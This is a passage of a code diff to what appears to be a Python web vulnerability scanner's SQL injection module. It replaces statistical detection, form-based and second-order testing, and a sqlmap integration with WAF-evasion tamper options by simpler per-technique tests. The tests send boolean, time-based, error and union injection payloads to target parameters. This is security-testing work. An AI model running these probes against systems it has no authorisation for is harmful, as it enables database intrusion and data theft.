-            'headers': dict(response.headers),
-            'num_tags': len(re.findall(r'<[^>]+>', response.text)),
-            'num_words': len(response.text.split()),
-            'num_lines': len(response.text.splitlines()),
-            'has_table': '<table' in response.text.lower(),
-            'has_form': '<form' in response.text.lower(),
-            'title': self._extract_title(response.text),
-            'hash': hashlib.md5(response.text.encode()).hexdigest(),
-        }
-    
-    def _extract_title(self, html: str) -> str:
-        """Extract title from HTML."""
-        match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
-        return match.group(1).strip() if match else ""
-    
-    def _enhanced_error_detection(self, response: httpx.Response, baseline: httpx.Response, 
-                                   payload_info: Dict) -> Dict[str, Any]:
-        """Enhanced error detection with confidence scoring."""
-        result = {
-            'vulnerable': False,
-            'confidence': 0.0,
-            'database_type': None,
-            'error_message': None,
-            'evidence': {}
-        }
-        
-        # Check if baseline has errors
-        baseline_has_errors = any(
-            re.search(pattern, baseline.text, re.IGNORECASE)
-            for pattern, _, _ in self.sql_error_patterns[:5]
-        )
-        
-        for pattern, base_confidence, db_type in self.sql_error_patterns:
-            match = re.search(pattern, response.text, re.IGNORECASE)
-            if match:
-                # Adjust confidence based on baseline
-                if baseline_has_errors:
-                    confidence = base_confidence * 0.4  # Reduce confidence
+        # Always include generic payloads
+        for technique in ['error_based', 'boolean_based', 'time_based', 'union_based']:
+            if technique in self.PAYLOADS:
+                payload_sets[technique] = []
+                
+                # Add generic payloads
+                if 'generic' in self.PAYLOADS[technique]:
+                    payload_sets[technique].extend(self.PAYLOADS[technique]['generic'])
+                
+                # Add database-specific payloads if detected
+                if self.detected_db:
+                    db_key = self.detected_db.lower()
+                    if db_key in self.PAYLOADS[technique]:
+                        payload_sets[technique].extend(self.PAYLOADS[technique][db_key])
                 else:
-                    confidence = base_confidence
-                
-                # Check if error is in typical error format
-                if re.search(r'(error|exception|warning).*?(sql|database|query)', 
-                           response.text, re.IGNORECASE):
-                    confidence = min(1.0, confidence + 0.1)
-                
-                # Extract error message
-                error_lines = []
-                for line in response.text.splitlines():
-                    if re.search(pattern, line, re.IGNORECASE):
-                        error_lines.append(line.strip())
-                
-                result = {
-                    'vulnerable': confidence > 0.7,
-                    'confidence': confidence,
-                    'database_type': db_type if db_type != 'Generic' else None,
-                    'error_message': ' '.join(error_lines[:2]) if error_lines else match.group(0),
-                    'evidence': {
-                        'pattern_matched': pattern,
-                        'error_snippet': match.group(0)[:200]
-                    }
-                }
-                break
+                    # If no database detected, add all database-specific payloads
+                    for db_payloads in self.PAYLOADS[technique].values():
+                        if isinstance(db_payloads, list):
+                            payload_sets[technique].extend(db_payloads)
         
-        return result
+        return payload_sets
     
-    async def _enhanced_boolean_detection(self, client: httpx.AsyncClient, url: str,
-                                          param_name: str, params: Dict, original_value: str,
-                                          baseline_data: Dict, config: Optional[ScanConfig] = None) -> Dict[str, Any]:
-        """Enhanced boolean-based blind SQL injection detection."""
-        result = {
-            'vulnerable': False,
-            'confidence': 0.0,
-            'evidence': {}
-        }
-        
-        parsed = urlparse(url)
-        
-        # Test true condition
-        true_payload = original_value + "' AND '1'='1"
-        test_params = params.copy()
-        test_params[param_name] = [true_payload]
-        true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
-        
-        try:
-            true_response = await self._rate_limited_request(client, true_url, config, timeout=15)
-            true_data = self._extract_response_features(true_response)
-            
-            # Test false condition
-            false_payload = original_value + "' AND '1'='2"
-            test_params[param_name] = [false_payload]
-            false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
-            
-            false_response = await self._rate_limited_request(client, false_url, config, timeout=15)
-            false_data = self._extract_response_features(false_response)
-            
-            # Calculate differences
-            length_diff = abs(true_data['length'] - false_data['length'])
-            status_diff = true_data['status_code'] != false_data['status_code']
-            hash_diff = true_data['hash'] != false_data['hash']
-            title_diff = true_data['title'] != false_data['title']
-            
-            # Compare with baseline
-            baseline_diff = abs(baseline_data['length'] - true_data['length'])
-            
-            # Calculate confidence
-            confidence = 0.0
-            if length_diff > 100 and length_diff > baseline_diff * 2:
-                confidence += 0.4
-            if status_diff:
-                confidence += 0.2
-            if hash_diff and length_diff > 50:
-                confidence += 0.2
-            if title_diff:
-                confidence += 0.2
-            
-            result = {
-                'vulnerable': confidence > 0.6,
-                'confidence': min(confidence, 0.9),
-                'evidence': {
-                    'true_length': true_data['length'],
-                    'false_length': false_data['length'],
-                    'length_difference': length_diff,
-                    'status_difference': status_diff,
-                    'hash_difference': hash_diff,
-                }
-            }
-        except (httpx.HTTPError, asyncio.TimeoutError) as e:
-            self.logger.debug(f"Boolean detection failed: {e}")
-        
-        return result
-    
-    async def _verify_sql_injection(self, client: httpx.AsyncClient, test_url: str, 
-                                    param_name: str, params: Dict) -> bool:
-        """Verify SQL injection to reduce false positives."""
-        try:
-            # Send the same payload again with rate limiting
-            response1 = await self._rate_limited_request(client, test_url, None, timeout=10)
-            response2 = await self._rate_limited_request(client, test_url, None, timeout=10)
-            
-            # Check consistency
-            if abs(len(response1.text) - len(response2.text)) > 1000:
-                return False  # Inconsistent, likely false positive
-            
-            # Check if both have SQL errors
-            has_error_1 = any(re.search(p, response1.text, re.IGNORECASE) 
-                            for p, _, _ in self.sql_error_patterns[:10])
-            has_error_2 = any(re.search(p, response2.text, re.IGNORECASE) 
-                            for p, _, _ in self.sql_error_patterns[:10])
-            
-            return has_error_1 and has_error_2
-        except Exception as e:
-            self.logger.debug(f"Verification failed: {e}")
-            return False
-    
-    def _create_vulnerability(self, param_name: str, url: str, payload_info: Dict,
-                            detection_result: Dict, injection_type: str) -> Vulnerability:
-        """Create a vulnerability object with detailed evidence."""
-        confidence = detection_result.get('confidence', 0.8)
-        evidence = {
-            'parameter': param_name,
-            'payload': payload_info['payload'],
-            'payload_type': payload_info['type'],
-            'payload_description': payload_info['description'],
-            'injection_type': injection_type,
-            **detection_result.get('evidence', {})
-        }
-        
-        if detection_result.get('database_type'):
-            evidence['database_type'] = detection_result['database_type']
-        
-        if detection_result.get('error_message'):
-            evidence['error_message'] = detection_result['error_message']
-        
-        # Determine severity
-        if confidence > 0.9:
-            severity = SeverityLevel.CRITICAL
-        elif confidence > 0.75:
-            severity = SeverityLevel.HIGH
-        else:
-            severity = SeverityLevel.MEDIUM
-        
-        return Vulnerability(
-            module=self.name,
-            name=f"SQL Injection ({injection_type}) in parameter '{param_name}'",
-            description=self._generate_detailed_description(injection_type, param_name, evidence),
-            severity=severity,
-            confidence=confidence,
-            affected_urls=[url],
-            evidence=evidence,
-            remediation=self._generate_remediation(injection_type),
-            references=[
-                "https://owasp.org/www-community/attacks/SQL_Injection",
-                "https://cwe.mitre.org/data/definitions/89.html",
-                "https://portswigger.net/web-security/sql-injection"
-            ],
-            cwe_ids=["CWE-89"]
-        )
-    
-    def _generate_detailed_description(self, injection_type: str, param_name: str, 
-                                      evidence: Dict) -> str:
-        """Generate detailed vulnerability description."""
-        desc = f"SQL Injection vulnerability detected in parameter '{param_name}' using {injection_type} technique. "
-        
-        if evidence.get('database_type'):
-            desc += f"Database identified as {evidence['database_type']}. "
-        
-        if evidence.get('error_message'):
-            desc += f"Error message disclosed: '{evidence['error_message'][:100]}...' "
-        
-        if injection_type == 'Boolean-Based Blind':
-            desc += f"Application shows different responses for true/false conditions (length difference: {evidence.get('length_difference', 'N/A')} bytes). "
-        
-        if injection_type == 'Time-Based Blind':
-            desc += f"Application response time indicates SQL injection (delay: {evidence.get('delay_observed', 'N/A')}s). "
-        
-        desc += "This vulnerability allows attackers to extract sensitive data, modify database contents, or gain unauthorized access."
-        
-        return desc
-    
-    def _generate_remediation(self, injection_type: str) -> str:
-        """Generate specific remediation advice."""
-        base = "1. Use parameterized queries (prepared statements) exclusively. "
-        base += "2. Never concatenate user input directly into SQL queries. "
-        base += "3. Implement input validation with whitelisting. "
-        base += "4. Apply principle of least privilege to database accounts. "
-        base += "5. Use Web Application Firewall (WAF) as defense-in-depth. "
-        
-        if 'Error' in injection_type:
-            base += "6. Disable detailed error messages in production. "
-            base += "7. Implement proper error handling and logging. "
-        
-        if 'Blind' in injection_type:
-            base += "6. Ensure consistent error responses. "
-            base += "7. Implement rate limiting and monitoring. "
-        
-        return base
-    
-    async def _advanced_time_based_detection(self, url: str, config: ScanConfig,
-                                            db_type: Optional[str]) -> Dict[str, Any]:
-        """Advanced time-based detection with statistical analysis."""
+    async def _test_technique(self, point: InjectionPoint, technique: str, payloads: List) -> List[Vulnerability]:
+        """Test a specific injection technique on an injection point."""
         vulnerabilities = []
         
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
+        if technique == 'error_based':
+            vulns = await self._test_error_based(point, payloads)
+            vulnerabilities.extend(vulns)
         
-        if not params:
-            return {'vulnerabilities': []}
+        elif technique == 'boolean_based':
+            vulns = await self._test_boolean_based(point, payloads)
+            vulnerabilities.extend(vulns)
         
-        async with httpx.AsyncClient(verify=False) as client:
-            for param_name, param_values in params.items():
-                original_value = param_values[0] if param_values else '1'
-                
-                # Measure baseline response times (5 requests)
-                baseline_times = []
-                for _ in range(self.BASELINE_REQUESTS):
-                    try:
-                        start = time.time()
-                        await self._rate_limited_request(client, url, config, timeout=20)
-                        baseline_times.append(time.time() - start)
-                    except (httpx.HTTPError, asyncio.TimeoutError) as e:
-                        self.logger.debug(f"Baseline timing request failed: {e}")
-                
-                if len(baseline_times) < 3:
-                    continue
-                
-                # Calculate baseline statistics
-                baseline_mean = statistics.mean(baseline_times)
-                baseline_stdev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0.5
-                
-                # Generate time-based payloads
-                time_payloads = self.payload_generator.generate_payloads('generic', db_type)
-                time_payloads = [p for p in time_payloads if p['type'] == 'time-based']
-                
-                for payload_info in time_payloads[:3]:  # Test top 3
-                    test_params = params.copy()
-                    test_params[param_name] = [original_value + payload_info['payload']]
-                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
-                    
-                    # Measure response times with payload (3 requests)
-                    payload_times = []
-                    for _ in range(self.TIME_BASED_REQUESTS):
-                        try:
-                            start = time.time()
-                            await self._rate_limited_request(client, test_url, config, timeout=20)
-                            elapsed = time.time() - start
-                            payload_times.append(elapsed)
-                        except asyncio.TimeoutError:
-                            payload_times.append(20)  # Timeout value
-                        except (httpx.HTTPError, Exception) as e:
-                            self.logger.debug(f"Time-based request failed: {e}")
-                    
-                    if len(payload_times) < 2:
-                        continue
-                    
-                    payload_mean = statistics.mean(payload_times)
-                    expected_delay = payload_info.get('delay', 5)
-                    
-                    # Statistical analysis
-                    time_increase = payload_mean - baseline_mean
-                    z_score = (payload_mean - baseline_mean) / (baseline_stdev + 0.1)
-                    
-                    # Check if time increase is significant
-                    if time_increase >= expected_delay * self.MIN_TIME_DELAY and z_score > self.STATISTICAL_Z_THRESHOLD:
-                        confidence = min(0.95, 0.6 + (time_increase / expected_delay) * 0.2)
-                        
-                        # Verify with second payload
-                        verified = False
-                        if len(time_payloads) > 1:
-                            verify_payload = time_payloads[1]
-                            test_params[param_name] = [original_value + verify_payload['payload']]
-                            verify_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
-                            
-                            try:
-                                start = time.time()
-                                await self._rate_limited_request(client, verify_url, config, timeout=20)
-                                verify_time = time.time() - start
-                                if verify_time >= expected_delay * self.MIN_TIME_DELAY:
-                                    verified = True
-                                    confidence = min(0.95, confidence + 0.1)
-                            except (httpx.HTTPError, asyncio.TimeoutError) as e:
-                                self.logger.debug(f"Verification request failed: {e}")
-                        
-                        vuln = Vulnerability(
-                            module=self.name,
-                            name=f"Time-Based Blind SQL Injection in '{param_name}'",
-                            description=self._generate_detailed_description('Time-Based Blind', param_name, {
-                                'baseline_mean': baseline_mean,
-                                'payload_mean': payload_mean,
-                                'time_increase': time_increase,
-                                'z_score': z_score,
-                            }),
-                            severity=SeverityLevel.HIGH,
-                            confidence=confidence,
-                            affected_urls=[url],
-                            evidence={
-                                'parameter': param_name,
-                                'payload': payload_info['payload'],
-                                'injection_type': 'Time-Based Blind',
-                                'baseline_mean': round(baseline_mean, 2),
-                                'payload_mean': round(payload_mean, 2),
-                                'time_increase': round(time_increase, 2),
-                                'expected_delay': expected_delay,
-                                'z_score': round(z_score, 2),
-                                'verified': verified,
-                                'statistical_significance': 'High' if z_score > 3 else 'Medium',
-                            },
-                            remediation=self._generate_remediation('Time-Based Blind'),
-                            cwe_ids=["CWE-89"]
-                        )
-                        vulnerabilities.append(vuln)
-                        break
+        elif technique == 'time_based':
+            vulns = await self._test_time_based(point, payloads)
+            vulnerabilities.extend(vulns)
         
-        return {'vulnerabilities': vulnerabilities}
-    
-    async def _second_order_detection(self, url: str, config: ScanConfig) -> Dict[str, Any]:
-        """Detect second-order SQL injection vulnerabilities."""
-        vulnerabilities = []
-        candidates = []
-        
-        try:
-            async with httpx.AsyncClient(verify=False, timeout=15) as client:
-                response = await self._rate_limited_request(client, url, config)
-                
-                # Find forms that might store data (using class-level compiled pattern)
-                forms = self.FORM_PATTERN.findall(response.text)
-                
-                storage_forms = []
-                for form_html in forms:
-                    # Look for forms with POST method and fields suggesting data storage
-                    if 'method' in form_html.lower() and ('post' in form_html.lower() or 'method' not in form_html.lower()):
-                        if any(keyword in form_html.lower() for keyword in ['name', 'email', 'username', 'comment', 'message']):
-                            storage_forms.append(form_html)
-                
-                # Test each storage form
-                for form_html in storage_forms[:2]:  # Test up to 2 forms
-                    action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
-                    action = action_match.group(1) if action_match else url
-                    
-                    if not action.startswith(('http://', 'https://')):
-                        action = urljoin(url, action)
-                    
-                    # Use class-level compiled pattern
-                    inputs = self.INPUT_PATTERN.findall(form_html)
-                    
-                    # Phase 1: Store payload
-                    unique_marker = f"sqli_test_{int(time.time())}"
-                    second_order_payload = f"{unique_marker}' OR '1'='1"
-                    
-                    form_data = {}
-                    for input_name in inputs:
-                        if 'name' in input_name.lower() or 'username' in input_name.lower():
-                            form_data[input_name] = second_order_payload
-                        else:
-                            form_data[input_name] = f"test_{unique_marker}"
-                    
-                    try:
-                        # Submit the form
-                        await client.post(action, data=form_data)
-                        
-                        # Phase 2: Crawl other pages to find where data is displayed
-                        links = re.findall(r'href=["\']([^"\']+)["\']', response.text)
-                        
-                        for link in links[:5]:  # Check up to 5 links
-                            if not link.startswith(('http://', 'https://')):
-                                link = urljoin(url, link)
-                            
-                            if urlparse(link).netloc != urlparse(url).netloc:
-                                continue
-                            
-                            try:
-                                check_response = await self._rate_limited_request(client, link, config, timeout=10)
-                                
-                                # Check if our unique marker appears
-                                if unique_marker in check_response.text:
-                                    candidates.append({
-                                        'storage_url': action,
-                                        'display_url': link,
-                                        'field': list(form_data.keys())[0]
-                                    })
-                                    
-                                    # Check for SQL errors indicating second-order injection
-                                    for pattern, confidence, db_type in self.sql_error_patterns[:10]:
-                                        if re.search(pattern, check_response.text, re.IGNORECASE):
-                                            vuln = Vulnerability(
-                                                module=self.name,
-                                                name=f"Second-Order SQL Injection",
-                                                description=f"Second-order SQL injection detected. Data stored at {action} is executed unsafely when displayed at {link}.",
-                                                severity=SeverityLevel.HIGH,
-                                                confidence=0.75,
-                                                affected_urls=[action, link],
-                                                evidence={
-                                                    'storage_endpoint': action,
-                                                    'display_endpoint': link,
-                                                    'injection_type': 'Second-Order',
-                                                    'field': list(form_data.keys())[0],
-                                                    'payload': second_order_payload,
-                                                    'database_type': db_type if db_type != 'Generic' else None,
-                                                },
-                                                remediation="Use parameterized queries for ALL database operations, including when retrieving and displaying stored data. Validate and sanitize data both on input AND output.",
-                                                cwe_ids=["CWE-89", "CWE-74"]
-                                            )
-                                            vulnerabilities.append(vuln)
-                                            break
-                            except (httpx.HTTPError, asyncio.TimeoutError) as e:
-                                self.logger.debug(f"Second-order check failed for {link}: {e}")
-                    except (httpx.HTTPError, Exception) as e:
-                        self.logger.debug(f"Second-order form submission failed: {e}")
-        except Exception as e:
-            self.logger.debug(f"Second-order detection error: {e}")
-        
-        return {'vulnerabilities': vulnerabilities, 'candidates': candidates}
-    
-    async def _context_aware_form_testing(self, url: str, config: ScanConfig,
-                                         db_type: Optional[str]) -> List[Vulnerability]:
-        """Test forms with context-aware payloads."""
-        vulnerabilities = []
-        
-        try:
-            async with httpx.AsyncClient(verify=False, timeout=15) as client:
-                response = await self._rate_limited_request(client, url, config)
-                
-                # Use class-level compiled pattern
-                forms = self.FORM_PATTERN.findall(response.text)
-                
-                for form_html in forms[:3]:
-                    action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
-                    action = action_match.group(1) if action_match else url
-                    
-                    if not action.startswith(('http://', 'https://')):
-                        action = urljoin(url, action)
-                    
-                    method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
-                    method = method_match.group(1).upper() if method_match else 'POST'
-                    
-                    # Use class-level compiled pattern
-                    inputs = self.INPUT_PATTERN.findall(form_html)
-                    
-                    # Detect form context
-                    if any(word in form_html.lower() for word in ['login', 'signin', 'auth']):
-                        context = 'auth'
-                    elif any(word in form_html.lower() for word in ['search', 'query']):
-                        context = 'search'
-                    else:
-                        context = 'generic'
-                    
-                    # Generate context-specific payloads
-                    payloads = self.payload_generator.generate_payloads(context, db_type)
-                    
-                    for input_name in inputs:
-                        for payload_info in payloads[:8]:
-                            form_data = {inp: 'test' for inp in inputs}
-                            form_data[input_name] = payload_info['payload']
-                            
-                            try:
-                                if method == 'POST':
-                                    test_response = await client.post(action, data=form_data, timeout=15)
-                                else:
-                                    test_response = await client.get(action, params=form_data, timeout=15)
-                                
-                                # Check for SQL errors
-                                error_result = self._enhanced_error_detection(
-                                    test_response, response, payload_info
-                                )
-                                
-                                if error_result['vulnerable']:
-                                    vuln = Vulnerability(
-                                        module=self.name,
-                                        name=f"SQL Injection in Form Field '{input_name}'",
-                                        description=self._generate_detailed_description(
-                                            'Error-Based', input_name, error_result.get('evidence', {})
-                                        ),
-                                        severity=SeverityLevel.CRITICAL if error_result['confidence'] > 0.9 else SeverityLevel.HIGH,
-                                        confidence=error_result['confidence'],
-                                        affected_urls=[action],
-                                        evidence={
-                                            'form_action': action,
-                                            'field': input_name,
-                                            'method': method,
-                                            'payload': payload_info['payload'],
-                                            'injection_type': 'Form-Based',
-                                            'context': context,
-                                            **error_result.get('evidence', {})
-                                        },
-                                        remediation=self._generate_remediation('Error-Based'),
-                                        cwe_ids=["CWE-89"]
-                                    )
-                                    vulnerabilities.append(vuln)
-                                    break
-                            except (httpx.HTTPError, asyncio.TimeoutError) as e:
-                                self.logger.debug(f"Form testing failed for {input_name}: {e}")
-        except Exception as e:
-            self.logger.debug(f"Context-aware form testing error: {e}")
+        elif technique == 'union_based':
+            vulns = await self._test_union_based(point, payloads)
+            vulnerabilities.extend(vulns)
         
         return vulnerabilities
     
-    async def _intelligent_sqlmap_integration(self, url: str, config: ScanConfig,
-                                             recon_data: Dict) -> Optional[Dict[str, Any]]:
-        """Intelligent SQLMap integration using reconnaissance data."""
-        try:
-            db_type = recon_data.get('database_type')
-            
-            # Build intelligent SQLMap command
-            options = ['--batch', '--random-agent', '--timeout=15', '--retries=2']
-            
-            # Add database-specific options
-            if db_type:
-                db_map = {
-                    'MySQL': 'MySQL',
-                    'PostgreSQL': 'PostgreSQL',
-                    'MSSQL': 'Microsoft SQL Server',
-                    'Oracle': 'Oracle',
-                    'SQLite': 'SQLite',
-                }
-                if db_type in db_map:
-                    options.append(f'--dbms={db_map[db_type]}')
-            
-            # Adjust level and risk based on scan type
-            if config.scan_type == ScanType.AGGRESSIVE:
-                options.extend(['--level=5', '--risk=3', '--threads=8'])
-            else:
-                options.extend(['--level=3', '--risk=2', '--threads=4'])
-            
-            # Add tamper scripts for WAF evasion
-            options.append('--tamper=space2comment,between')
-            
-            with tempfile.TemporaryDirectory() as temp_dir:
-                output_dir = os.path.join(temp_dir, 'sqlmap_output')
-                cmd = ['sqlmap', '-u', url] + options + [f'--output-dir={output_dir}']
+    async def _test_error_based(self, point: InjectionPoint, payloads: List[str]) -> List[Vulnerability]:
+        """Test error-based SQL injection."""
+        vulnerabilities = []
+        
+        for payload in payloads:
+            try:
+                response = await self._send_payload(point, payload)
+                if not response:
+                    continue
                 
-                # Run SQLMap with proper cleanup
-                process = None
-                try:
-                    process = subprocess.Popen(
-                        cmd,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        text=True
-                    )
-                    stdout, stderr = process.communicate(timeout=config.timeout)
-                    result_text = stdout
-                except subprocess.TimeoutExpired:
-                    if process:
-                        process.terminate()
-                        try:
-                            process.wait(timeout=5)
-                        except subprocess.TimeoutExpired:
-                            process.kill()
-                    self.logger.warning("SQLMap timed out")
-                    return None
-                
-                vulnerabilities = []
-                vulnerable_params = []
-                database_type = None
-                
-                if result_text and 'vulnerable' in result_text.lower():
-                    param_pattern = re.compile(r"Parameter: ([^\s]+)")
-                    params = param_pattern.findall(result_text)
-                    vulnerable_params.extend(params)
-                    
-                    db_pattern = re.compile(r"back-end DBMS: ([^\n]+)")
-                    db_match = db_pattern.search(result_text)
-                    if db_match:
-                        database_type = db_match.group(1).strip()
-                    
-                    for param in params:
-                        vulnerabilities.append(
-                            Vulnerability(
-                                module=self.name,
-                                name=f"SQL Injection (SQLMap Confirmed) in '{param}'",
-                                description=f"SQLMap, an industry-standard SQL injection tool, confirmed a SQL injection vulnerability in parameter '{param}'. This is a high-confidence finding.",
-                                severity=SeverityLevel.CRITICAL,
-                                confidence=1.0,
-                                affected_urls=[url],
-                                evidence={
-                                    'parameter': param,
-                                    'database_type': database_type,
-                                    'tool': 'SQLMap',
-                                    'injection_type': 'Confirmed by Automated Tool',
-                                },
-                                remediation=self._generate_remediation('Confirmed'),
-                                references=[
-                                    "https://owasp.org/www-community/attacks/SQL_Injection",
-                                    "https://sqlmap.org/"
-                                ],
-                                cwe_ids=["CWE-89"]
-                            )
+                # Check for SQL errors
+                for pattern, confidence, db_type in self.SQL_ERRORS:
+                    if re.search(pattern, response.text, re.IGNORECASE):
+                        vuln = Vulnerability(
+                            module=self.name,
+                            name=f"Error-Based SQL Injection in '{point.param_name}'",
+                            description=f"SQL injection vulnerability detected in parameter '{point.param_name}' "
+                                      f"using error-based technique. Database: {db_type}. "
+                                      f"The application returns database error messages that can be exploited "
+                                      f"to extract sensitive information.",
+                            severity=SeverityLevel.CRITICAL if confidence > 0.9 else SeverityLevel.HIGH,
+                            confidence=confidence,
+                            affected_urls=[point.url],
+                            evidence={
+                                'parameter': point.param_name,
+                                'parameter_type': point.param_type,
+                                'payload': payload,
+                                'injection_type': 'Error-Based',
+                                'technique': 'error_based',
+                                'database_type': db_type,
+                                'method': point.method,
+                                'error_pattern': pattern,
+                                'response_snippet': response.text[:500]
+                            },
+                            remediation="Use parameterized queries (prepared statements) instead of string concatenation. "
+                                      "Implement proper input validation and sanitization. "
+                                      "Disable detailed error messages in production.",
+                            cwe_ids=["CWE-89"],
+                            cvss_score=9.8
                         )
+                        vulnerabilities.append(vuln)
+                        logger.info(f"    ✓ Error-based SQLi found: {db_type}")
+                        return vulnerabilities  # Found one, return
                 
-                return {
-                    'vulnerabilities': vulnerabilities,
-                    'vulnerable_params': vulnerable_params,
-                    'database_type': database_type
-                }
+            except Exception as e:
+                logger.debug(f"Error testing payload: {e}")
+        
+        return vulnerabilities
+    
+    async def _test_boolean_based(self, point: InjectionPoint, payloads: List) -> List[Vulnerability]:
+        """Test boolean-based blind SQL injection."""
+        vulnerabilities = []
+        
+        # Get baseline response
+        point_key = f"{point.method}:{point.url}:{point.param_name}"
+        baseline = self.baselines.get(point_key)
+        
+        for payload_pair in payloads:
+            if not isinstance(payload_pair, tuple) or len(payload_pair) != 2:
+                continue
+            
+            true_payload, false_payload = payload_pair
+            
+            try:
+                # Test true condition
+                true_response = await self._send_payload(point, true_payload)
+                if not true_response:
+                    continue
+                
+                await asyncio.sleep(0.5)
+                
+                # Test false condition
+                false_response = await self._send_payload(point, false_payload)
+                if not false_response:
+                    continue
+                
+                # Compare responses
+                true_size = len(true_response.text)
+                false_size = len(false_response.text)
+                size_diff = abs(true_size - false_size)
+                
+                # Check if responses are significantly different
+                if size_diff > 100 or true_response.status_code != false_response.status_code:
+                    vuln = Vulnerability(
+                        module=self.name,
+                        name=f"Boolean-Based Blind SQL Injection in '{point.param_name}'",
+                        description=f"Boolean-based blind SQL injection detected in parameter '{point.param_name}'. "
+                                  f"The application responds differently to true and false SQL conditions, "
+                                  f"allowing data extraction through binary search techniques.",
+                        severity=SeverityLevel.HIGH,
+                        confidence=0.85,
+                        affected_urls=[point.url],
+                        evidence={
+                            'parameter': point.param_name,
+                            'parameter_type': point.param_type,
+                            'true_payload': true_payload,
+                            'false_payload': false_payload,
+                            'injection_type': 'Boolean-Based Blind',
+                            'technique': 'boolean_based',
+                            'method': point.method,
+                            'true_response_size': true_size,
+                            'false_response_size': false_size,
+                            'size_difference': size_diff
+                        },
+                        remediation="Use parameterized queries. Implement proper input validation. "
+                                  "Ensure consistent error handling that doesn't leak information.",
+                        cwe_ids=["CWE-89"],
+                        cvss_score=8.6
+                    )
+                    vulnerabilities.append(vuln)
+                    logger.info(f"    ✓ Boolean-based blind SQLi found")
+                    return vulnerabilities
+                
+            except Exception as e:
+                logger.debug(f"Error testing boolean payload: {e}")
+        
+        return vulnerabilities
+    
+    async def _test_time_based(self, point: InjectionPoint, payloads: List) -> List[Vulnerability]:
+        """Test time-based blind SQL injection."""
+        vulnerabilities = []
+        
+        # Get baseline
+        point_key = f"{point.method}:{point.url}:{point.param_name}"
+        baseline = self.baselines.get(point_key)
+        baseline_time = baseline['avg_response_time'] if baseline else 1.0
+        
+        for payload_data in payloads:
+            if not isinstance(payload_data, tuple) or len(payload_data) != 2:
+                continue
+            
+            payload, expected_delay = payload_data
+            
+            try:
+                start_time = time.time()
+                response = await self._send_payload(point, payload, timeout=expected_delay + 10)
+                elapsed = time.time() - start_time
+                
+                # Check if response was delayed
+                if elapsed >= (baseline_time + expected_delay * 0.8):
+                    # Verify with second test
+                    start_time = time.time()
+                    response2 = await self._send_payload(point, payload, timeout=expected_delay + 10)
+                    elapsed2 = time.time() - start_time
+                    
+                    if elapsed2 >= (baseline_time + expected_delay * 0.8):
+                        vuln = Vulnerability(
+                            module=self.name,
+                            name=f"Time-Based Blind SQL Injection in '{point.param_name}'",
+                            description=f"Time-based blind SQL injection detected in parameter '{point.param_name}'. "
+                                      f"The application's response time can be controlled through SQL time delay functions, "
+                                      f"allowing data extraction bit by bit.",
+                            severity=SeverityLevel.HIGH,
+                            confidence=0.90,
+                            affected_urls=[point.url],
+                            evidence={
+                                'parameter': point.param_name,
+                                'parameter_type': point.param_type,
+                                'payload': payload,
+                                'injection_type': 'Time-Based Blind',
+                                'technique': 'time_based',
+                                'method': point.method,
+                                'expected_delay': expected_delay,
+                                'actual_delay_1': elapsed,
+                                'actual_delay_2': elapsed2,
+                                'baseline_time': baseline_time
+                            },
+                            remediation="Use parameterized queries. Implement query timeouts. "
+                                      "Monitor and log slow queries.",
+                            cwe_ids=["CWE-89"],
+                            cvss_score=8.2
+                        )
+                        vulnerabilities.append(vuln)
+                        logger.info(f"    ✓ Time-based blind SQLi found (delay: {elapsed:.2f}s)")
+                        return vulnerabilities
+                
+            except asyncio.TimeoutError:
+                # Timeout can also indicate time-based injection
+                vuln = Vulnerability(
+                    module=self.name,
+                    name=f"Time-Based Blind SQL Injection in '{point.param_name}' (Timeout)",
+                    description=f"Time-based blind SQL injection detected (request timeout). "
+                                f"Parameter '{point.param_name}' is vulnerable.",
+                    severity=SeverityLevel.HIGH,
+                    confidence=0.80,
+                    affected_urls=[point.url],
+                    evidence={
+                        'parameter': point.param_name,
+                        'parameter_type': point.param_type,
+                        'payload': payload,
+                        'injection_type': 'Time-Based Blind',
+                        'technique': 'time_based',
+                        'method': point.method,
+                        'result': 'timeout'
+                    },
+                    remediation="Use parameterized queries.",
+                    cwe_ids=["CWE-89"],
+                    cvss_score=8.2
+                )
+                vulnerabilities.append(vuln)
+                logger.info(f"    ✓ Time-based blind SQLi found (timeout)")
+                return vulnerabilities
+            except Exception as e:
+                logger.debug(f"Error testing time-based payload: {e}")
+        
+        return vulnerabilities
+    
+    async def _test_union_based(self, point: InjectionPoint, payloads: List[str]) -> List[Vulnerability]:
+        """Test union-based SQL injection."""
+        vulnerabilities = []
+        
+        for payload in payloads:
+            try:
+                response = await self._send_payload(point, payload)
+                if not response:
+                    continue
+                
+                # Check for successful UNION injection indicators
+                union_indicators = [
+                    r'version\(\)',
+                    r'database\(\)',
+                    r'user\(\)',
+                    r'@@version',
+                    r'current_database',
+                    r'information_schema',
+                    r'mysql\.',
+                    r'pg_',
+                ]
+                
+                for indicator in union_indicators:
+                    if re.search(indicator, response.text, re.IGNORECASE):
+                        vuln = Vulnerability(
+                            module=self.name,
+                            name=f"Union-Based SQL Injection in '{point.param_name}'",
+                            description=f"Union-based SQL injection detected in parameter '{point.param_name}'. "
+                                      f"The application allows UNION queries, enabling direct data extraction "
+                                      f"from the database.",
+                            severity=SeverityLevel.CRITICAL,
+                            confidence=0.95,
+                            affected_urls=[point.url],
+                            evidence={
+                                'parameter': point.param_name,
+                                'parameter_type': point.param_type,
+                                'payload': payload,
+                                'injection_type': 'Union-Based',
+                                'technique': 'union_based',
+                                'method': point.method,
+                                'indicator_found': indicator,
+                                'response_snippet': response.text[:500]
+                            },
+                            remediation="Use parameterized queries. Implement strict input validation. "
+                                      "Use least privilege database accounts.",
+                            cwe_ids=["CWE-89"],
+                            cvss_score=9.8
+                        )
+                        vulnerabilities.append(vuln)
